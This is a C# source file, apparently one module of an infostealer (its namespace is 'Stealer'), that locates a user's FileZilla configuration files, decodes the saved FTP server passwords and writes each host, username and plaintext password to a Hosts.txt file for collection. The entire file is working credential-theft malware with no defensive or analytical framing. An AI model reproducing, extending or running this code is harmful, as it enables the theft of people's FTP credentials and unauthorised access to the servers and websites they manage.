using System;
using System.IO;
using System.Xml;
using System.Text;
using System.Collections.Generic;


namespace Stealer
{
    internal sealed class FileZilla
    {

        // Get filezilla .xml files
        private static string[] GetPswPath()
        {
            string fz = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\";
            return new string[] { fz + "recentservers.xml", fz + "sitemanager.xml" };
        }

        public static List<Password> Steal()
        {
            List<Password> lpPasswords = new List<Password>();

            string[] files = GetPswPath();
            // If files not exists
            if (!File.Exists(files[0]) && !File.Exists(files[1]))
                return lpPasswords;

            foreach (string pwFile in files)
            {
                try
                {
                    if (!File.Exists(pwFile))
                        continue;

                    XmlDocument xDOC = new XmlDocument();
                    xDOC.Load(pwFile);

                    foreach (XmlNode xNode in xDOC.GetElementsByTagName("Server"))
                    {

                        Password pPassword = new Password();

                        pPassword.sUrl = "ftp://" + xNode["Host"].InnerText + ":" + xNode["Port"].InnerText + "/";
                        pPassword.sUsername = xNode["User"].InnerText;
                        pPassword.sPassword = Encoding.UTF8.GetString(Convert.FromBase64String(xNode["Pass"].InnerText));

                        Counter.FTPHosts++;
                        lpPasswords.Add(pPassword);

                    }

                }
                catch { }
            }
            
            return lpPasswords;
        }

        // Format FileZilla passwords
        private static string FormatPassword(Password pPassword)
        {
            return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
        }

        // Write FileZilla passwords
        public static void WritePasswords(List<Password> pPasswords, string sSavePath)
        {
            if (pPasswords.Count != 0)
            {
                Directory.CreateDirectory(sSavePath);
                foreach (Password p in pPasswords)
                {
                    File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(p));
                }
            }
        }

    }
}
